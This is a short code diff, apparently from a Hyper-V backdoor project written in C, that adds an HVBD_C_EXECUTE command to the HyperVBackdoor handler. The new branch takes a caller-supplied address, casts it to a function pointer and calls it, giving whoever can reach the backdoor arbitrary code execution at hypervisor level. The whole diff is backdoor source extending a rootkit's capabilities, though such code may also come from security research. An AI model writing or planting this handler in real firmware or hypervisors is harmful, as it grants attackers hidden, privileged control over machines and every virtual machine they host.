@@ -82,6 +82,8 @@ typedef struct _HVBD_DATA
 
 // offset of the HVBD_DATA 
 #define HVBD_DATA_ADDR (PAGE_SIZE - sizeof(HVBD_DATA))
+
+typedef UINT64 (__stdcall * EXECUTE_FUNC)(UINT64 Arg0, UINT64 Arg1);
 //--------------------------------------------------------------------------------------
 VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 {
@@ -231,6 +233,16 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 
             // read current VMCS address
             __vmx_vmptrst(Arg0);
+
+            Status = EFI_SUCCESS;
+        }
+        else if (Code == HVBD_C_EXECUTE)
+        {
+            EXECUTE_FUNC Func = (EXECUTE_FUNC)(*Arg2);            
+
+            // execute arbitrary code
+            *Arg2 = 0;
+            *Arg2 = Func(*Arg0, *Arg1);
 
             Status = EFI_SUCCESS;
         }
